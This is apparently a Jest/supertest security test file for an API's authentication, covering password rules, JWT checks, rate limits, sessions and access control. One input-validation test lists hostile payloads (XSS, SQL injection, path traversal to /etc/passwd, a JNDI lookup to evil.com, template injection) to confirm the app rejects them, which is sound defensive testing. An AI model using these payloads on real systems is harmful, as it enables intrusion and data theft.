import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import { app } from '../../api-gateway/src/app';

describe('Authentication Security Tests', () => {
  let testUser: any;
  let authToken: string;

  beforeAll(async () => {
    // Create test user
    const response = await request(app)
      .post('/api/v1/auth/register')
      .send({
        username: 'security-test-user',
        email: 'security@test.com',
        password: 'SecurePassword123!',
        firstName: 'Security',
        lastName: 'Test'
      });
    
    testUser = response.body.user;
    authToken = response.body.accessToken;
  });

  afterAll(async () => {
    // Cleanup test user
    await request(app)
      .delete(`/api/v1/users/${testUser.id}`)
      .set('Authorization', `Bearer ${authToken}`);
  });

  describe('Password Security', () => {
    it('should reject weak passwords', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        'abc123',
        'Password',
        'PASSWORD123'
      ];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            username: `weak-password-${Date.now()}`,
            email: `weak-${Date.now()}@test.com`,
            password,
            firstName: 'Test',
            lastName: 'User'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('password');
      }
    });

    it('should enforce password complexity requirements', async () => {
      const response = await request(app)
        .post('/api/v1/auth/register')
        .send({
          username: 'complexity-test',
          email: 'complexity@test.com',
          password: 'SimplePassword',
          firstName: 'Test',
          lastName: 'User'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('password');
    });

    it('should hash passwords securely', async () => {
      const response = await request(app)
        .post('/api/v1/auth/register')
        .send({
          username: 'hash-test',
          email: 'hash@test.com',
          password: 'SecurePassword123!',
          firstName: 'Test',
          lastName: 'User'
        });

      expect(response.status).toBe(201);
      expect(response.body.user.password).toBeUndefined();
      expect(response.body.user.passwordHash).toBeUndefined();
    });
  });

  describe('JWT Security', () => {
    it('should reject invalid tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        '',
        null,
        undefined
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .get('/api/v1/users/profile')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
      }
    });

    it('should reject expired tokens', async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
      
      const response = await request(app)
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
    });

    it('should include proper JWT claims', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          username: 'security-test-user',
          password: 'SecurePassword123!'
        });

      expect(response.status).toBe(200);
      expect(response.body.accessToken).toBeDefined();
      
      // Decode JWT to verify claims
      const token = response.body.accessToken;
      const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
      
      expect(payload.sub).toBeDefined();
      expect(payload.iat).toBeDefined();
      expect(payload.exp).toBeDefined();
      expect(payload.role).toBeDefined();
    });
  });

  describe('Rate Limiting', () => {
    it('should limit login attempts', async () => {
      const maxAttempts = 5;
      
      for (let i = 0; i < maxAttempts + 1; i++) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            username: 'security-test-user',
            password: 'WrongPassword'
          });

        if (i < maxAttempts) {
          expect(response.status).toBe(401);
        } else {
          expect(response.status).toBe(429);
        }
      }
    });

    it('should limit registration attempts', async () => {
      const maxAttempts = 3;
      
      for (let i = 0; i < maxAttempts + 1; i++) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            username: `rate-limit-${i}`,
            email: `rate-limit-${i}@test.com`,
            password: 'SecurePassword123!',
            firstName: 'Test',
            lastName: 'User'
          });

        if (i < maxAttempts) {
          expect(response.status).toBe(201);
        } else {
          expect(response.status).toBe(429);
        }
      }
    });
  });

  describe('Input Validation', () => {
    it('should sanitize user input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users; DROP TABLE users;',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        'javascript:alert(1)'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            username: input,
            email: `${input}@test.com`,
            password: 'SecurePassword123!',
            firstName: input,
            lastName: input
          });

        expect(response.status).toBe(400);
      }
    });

    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        '@test.com',
        'test@',
        'test..test@test.com',
        'test@test..com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            username: 'email-test',
            email,
            password: 'SecurePassword123!',
            firstName: 'Test',
            lastName: 'User'
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Session Security', () => {
    it('should invalidate sessions on logout', async () => {
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          username: 'security-test-user',
          password: 'SecurePassword123!'
        });

      const token = loginResponse.body.accessToken;

      // Verify token works
      const profileResponse = await request(app)
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${token}`);

      expect(profileResponse.status).toBe(200);

      // Logout
      await request(app)
        .post('/api/v1/auth/logout')
        .set('Authorization', `Bearer ${token}`);

      // Verify token is invalidated
      const invalidatedResponse = await request(app)
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${token}`);

      expect(invalidatedResponse.status).toBe(401);
    });

    it('should handle concurrent sessions', async () => {
      const session1 = await request(app)
        .post('/api/v1/auth/login')
        .send({
          username: 'security-test-user',
          password: 'SecurePassword123!'
        });

      const session2 = await request(app)
        .post('/api/v1/auth/login')
        .send({
          username: 'security-test-user',
          password: 'SecurePassword123!'
        });

      expect(session1.status).toBe(200);
      expect(session2.status).toBe(200);
      expect(session1.body.accessToken).not.toBe(session2.body.accessToken);
    });
  });

  describe('Authorization', () => {
    it('should enforce role-based access control', async () => {
      const userResponse = await request(app)
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${authToken}`);

      expect(userResponse.status).toBe(200);

      // Try to access admin endpoint
      const adminResponse = await request(app)
        .get('/api/v1/admin/users')
        .set('Authorization', `Bearer ${authToken}`);

      expect(adminResponse.status).toBe(403);
    });

    it('should prevent privilege escalation', async () => {
      const response = await request(app)
        .patch('/api/v1/users/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          role: 'admin'
        });

      expect(response.status).toBe(400);
    });
  });
});
